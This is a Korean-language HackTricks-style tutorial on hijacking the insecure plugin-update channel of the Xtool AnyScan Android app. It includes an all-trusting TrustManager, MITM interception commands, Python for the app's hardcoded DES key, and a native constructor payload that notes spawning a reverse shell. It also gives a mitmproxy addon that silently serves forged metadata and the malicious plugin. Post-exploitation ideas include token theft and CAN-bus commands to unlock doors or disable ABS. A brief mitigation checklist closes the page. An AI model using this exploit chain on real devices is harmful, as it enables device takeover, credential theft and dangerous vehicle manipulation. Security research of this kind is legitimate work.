# Insecure In-App Update Mechanisms – Remote Code Execution via Malicious Plugins

{{#include ../../banners/hacktricks-training.md}}

많은 Android 애플리케이션이 Google Play 스토어 대신 **자체 “플러그인” 또는 “동적 기능” 업데이트 채널**을 구현합니다. 구현이 안전하지 않으면, 트래픽을 가로챌 수 있는 공격자가 **앱 프로세스 내에서 로드될 임의의 네이티브 코드를 제공할 수** 있으며, 이는 핸드셋에서 완전한 원격 코드 실행(RCE)으로 이어질 수 있습니다 – 경우에 따라 앱이 제어하는 외부 장치(자동차, IoT, 의료 기기 등)에서도 가능합니다.

이 페이지는 Xtool **AnyScan** 자동차 진단 앱(v4.40.11 → 4.40.40)에서 발견된 실제 취약점 체인을 요약하고, 이 기술을 일반화하여 다른 Android 앱을 감사하고 레드팀 참여 중 잘못된 구성을 무기화할 수 있도록 합니다.

---
## 1. Insecure TLS TrustManager 식별하기

1. jadx / apktool로 APK를 디컴파일하고 네트워킹 스택(OkHttp, HttpUrlConnection, Retrofit 등)을 찾습니다.
2. 모든 인증서를 맹목적으로 신뢰하는 **커스텀 `TrustManager`** 또는 `HostnameVerifier`를 찾습니다:
```java
public static TrustManager[] buildTrustManagers() {
return new TrustManager[]{
new X509TrustManager() {
public void checkClientTrusted(X509Certificate[] chain, String authType) {}
public void checkServerTrusted(X509Certificate[] chain, String authType) {}
public X509Certificate[] getAcceptedIssuers() {return new X509Certificate[]{};}
}
};
}
```
3. 존재하는 경우 애플리케이션은 **모든 TLS 인증서**를 수락합니다 → 자체 서명된 인증서로 투명한 **MITM 프록시**를 실행할 수 있습니다:
```bash
mitmproxy -p 8080 -s addon.py  # see §4
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 8080  # on rooted device / emulator
```
## 2. 업데이트 메타데이터 리버스 엔지니어링

AnyScan 사례에서 각 앱 실행은 다음에 대한 HTTPS GET을 트리거합니다:
```
https://apigw.xtoolconnect.com/uhdsvc/UpgradeService.asmx/GetUpdateListEx
```
응답 본문은 모든 사용 가능한 플러그인을 설명하는 **Base64로 인코딩되고, DES-ECB로 암호화된** JSON을 포함하는 `<FileData>` 노드를 가진 **XML 문서**입니다.

전형적인 헌팅 단계:
1. 암호화 루틴(예: `RemoteServiceProxy`)을 찾고 복구합니다:
* 알고리즘 (DES / AES / RC4 …)
* 작동 모드 (ECB / CBC / GCM …)
* 하드코딩된 키 / IV (종종 상수에서 56비트 DES 키 또는 128비트 AES 키)
2. 메타데이터를 복호화 / 암호화하기 위해 Python에서 함수를 재구현합니다:
```python
from Crypto.Cipher import DES
from base64 import b64decode, b64encode

KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"  # 56-bit key observed in AnyScan

def decrypt_metadata(data_b64: str) -> bytes:
cipher = DES.new(KEY, DES.MODE_ECB)
return cipher.decrypt(b64decode(data_b64))

def encrypt_metadata(plaintext: bytes) -> str:
cipher = DES.new(KEY, DES.MODE_ECB)
return b64encode(cipher.encrypt(plaintext.ljust((len(plaintext)+7)//8*8, b"\x00"))).decode()
```
## 3. 악성 플러그인 만들기

1. 합법적인 플러그인 ZIP 파일을 선택하고 네이티브 라이브러리를 당신의 페이로드로 교체합니다:
```c
// libscan_x64.so – constructor runs as soon as the library is loaded
__attribute__((constructor))
void init(void){
__android_log_print(ANDROID_LOG_INFO, "PWNED", "Exploit loaded! uid=%d", getuid());
// spawn reverse shell, drop file, etc.
}
```

```bash
$ aarch64-linux-android-gcc -shared -fPIC payload.c -o libscan_x64.so
$ zip -r PWNED.zip libscan_x64.so assets/ meta.txt
```
2. JSON 메타데이터를 업데이트하여 `"FileName" : "PWNED.zip"`로 설정하고 `"DownloadURL"`이 당신의 HTTP 서버를 가리키도록 합니다.  
3. 수정된 JSON을 DES로 암호화한 후 Base64로 인코딩하고 가로챈 XML 안에 다시 복사합니다.

## 4. mitmproxy로 페이로드 전달

`addon.py` 예제는 원본 메타데이터를 *조용히* 교체합니다:
```python
from mitmproxy import http
MOD_XML = open("fake_metadata.xml", "rb").read()

def request(flow: http.HTTPFlow):
if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
flow.response = http.Response.make(
200,
MOD_XML,
{"Content-Type": "text/xml"}
)
```
악성 ZIP 파일을 호스팅하기 위해 간단한 웹 서버를 실행합니다:
```bash
python3 -m http.server 8000 --directory ./payloads
```
피해자가 앱을 실행하면 다음과 같은 작업을 수행합니다:
* MITM 채널을 통해 위조된 XML을 가져옵니다;
* 하드코딩된 DES 키로 이를 복호화하고 파싱합니다;
* `PWNED.zip`을 다운로드하여 개인 저장소에 압축 해제합니다;
* 포함된 *libscan_x64.so*를 `dlopen()`하여 앱의 권한(카메라, GPS, 블루투스, 파일 시스템 등)으로 즉시 코드를 실행합니다.

플러그인이 디스크에 캐시되기 때문에 백도어는 **재부팅 간에 지속**되며 사용자가 관련 기능을 선택할 때마다 실행됩니다.

## 5. 포스트 익스플로잇 아이디어

* 앱에 의해 저장된 세션 쿠키, OAuth 토큰 또는 JWT를 훔칩니다.
* 두 번째 단계 APK를 드롭하고 `pm install`을 통해 조용히 설치합니다(앱은 이미 `REQUEST_INSTALL_PACKAGES` 권한을 가지고 있습니다).
* 연결된 하드웨어를 악용합니다 – AnyScan 시나리오에서는 임의의 **OBD-II / CAN 버스 명령**(문 잠금 해제, ABS 비활성화 등)을 보낼 수 있습니다.

---
### 탐지 및 완화 체크리스트 (블루 팀)

* 인증서 검증을 비활성화하는 사용자 정의 TrustManager/HostnameVerifier가 포함된 프로덕션 빌드를 절대 배포하지 마십시오.
* Google Play 외부에서 실행 가능한 코드를 다운로드하지 마십시오. *필요한 경우*, 각 플러그인을 동일한 **apkSigning v2** 키로 서명하고 로드하기 전에 서명을 확인하십시오.
* 약한/하드코딩된 암호를 **AES-GCM** 및 서버 측 회전 키로 교체하십시오.
* 다운로드한 아카이브의 무결성을 검증하십시오(서명 또는 최소한 SHA-256).

---
## 참조

- [NowSecure – Xtool AnyScan 앱에서 발견된 원격 코드 실행](https://www.nowsecure.com/blog/2025/07/16/remote-code-execution-discovered-in-xtool-anyscan-app-risks-to-phones-and-vehicles/)
- [Android – 안전하지 않은 TrustManager 패턴](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager)

{{#include ../../banners/hacktricks-training.md}}
